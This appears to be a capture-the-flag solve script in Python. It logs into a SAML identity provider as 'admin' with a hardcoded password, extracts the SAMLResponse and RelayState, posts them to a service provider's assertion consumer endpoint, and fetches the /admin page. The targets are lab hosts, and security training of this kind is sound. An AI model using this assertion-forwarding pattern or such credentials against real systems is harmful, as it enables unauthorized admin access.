import urllib.request, urllib.parse, http.cookiejar, re, html as htmlmod

IDP = "http://oj-10-30-15-1-58595.adworld.xctf.org.cn"
SP  = "http://oj-10-30-15-1-49263.adworld.xctf.org.cn"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [('User-Agent','Mozilla/5.0')]

op.open(IDP+"/login", data=urllib.parse.urlencode({"username":"admin","password":"RCTF2025"}).encode(), timeout=30)
page = op.open(IDP+"/saml/idp/Flag", timeout=30).read().decode('utf-8','replace')

samlresp = re.search(r'name="SAMLResponse" value="([^"]*)"', page).group(1)
relay = re.search(r'name="RelayState" value="([^"]*)"', page)
relay = relay.group(1) if relay else '/admin'
print("SAMLResponse len:", len(samlresp), "RelayState:", relay)

# POST to SP ACS
data = urllib.parse.urlencode({"SAMLResponse": samlresp, "RelayState": relay}).encode()
try:
    r = op.open(SP+"/saml/acs", data=data, timeout=30)
    body = r.read().decode('utf-8','replace')
    print("ACS ->", r.geturl(), r.status)
    print(body[:2000])
    # follow to /admin
    r2 = op.open(SP+"/admin", timeout=30)
    b2 = r2.read().decode('utf-8','replace')
    print("\n=== /admin ->", r2.geturl(), r2.status)
    print(b2[:3000])
except urllib.error.HTTPError as e:
    print("HTTPError", e.code, e.geturl())
    print(e.read().decode('utf-8','replace')[:3000])
